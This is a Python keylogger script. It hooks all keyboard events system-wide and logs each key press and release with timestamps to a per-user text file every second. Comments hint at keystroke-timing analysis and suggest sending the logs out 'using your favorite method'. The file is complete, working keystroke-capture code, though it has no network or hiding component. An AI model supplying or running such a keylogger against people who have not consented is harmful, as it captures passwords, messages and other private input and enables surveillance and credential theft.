
import keyboard # for keylogs
from threading import Timer
from datetime import datetime
import os

SEND_REPORT_EVERY = 1

#time now printed.
#reordered for "event, key, time"
#still prints repeat characters at the end of the string but This
#doesnt affect the time so it is ok - can remove it easily in the parser

currentUser = 'oskar'

class Keylogger:
    current_letter=''

    def __init__(self, interval):
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""


    def callback(self, event):

        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        eventtype = event.event_type
        now = event.time

        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = "space"
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        if eventtype == "up":
            name = name + " " + str(now) + " Released" + "\n"
        elif eventtype == "down" and Keylogger.current_letter != name:
            Keylogger.current_letter = name
            name = name + " " + str(now) + " Pressed" + "\n"

        # finally, add the key name to our global `self.log` variable
        self.log += name


    def report_to_file(self):
        file_name = os.path.join('keylogs', f"{currentUser}.txt")
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""

        # write the keylogs to the file
        myfile = open(file_name, "a")

        myfile.write(self.log)
        print(f"[+] Saved logs for {currentUser}.txt")
        # myfile.close()



    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()


    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.hook(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
